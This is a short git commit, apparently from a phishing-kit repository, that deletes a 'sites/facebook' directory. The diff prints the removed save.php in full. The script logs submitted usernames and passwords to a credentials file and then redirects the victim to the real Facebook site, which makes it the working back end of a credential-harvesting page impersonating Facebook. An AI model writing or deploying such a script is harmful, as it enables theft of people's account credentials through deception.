d1d3d5645411ed3f4ccb0ed6ea2cd3e880a9f3d6
SSLRI <40920744+SSLRI@users.noreply.github.com>
2025-05-29 04:28:53 +0330

    Delete sites/facebook directory

--- sites/facebook/save.php
+++
@@ -1,5 +0,0 @@
-<?php
-file_put_contents("../credentials.txt", date("Y-m-d H:i:s")." | ".$_POST['username']." | ".$_POST['password']."\n", FILE_APPEND);
-header("Location: https://facebook.com");
-exit();
-?>
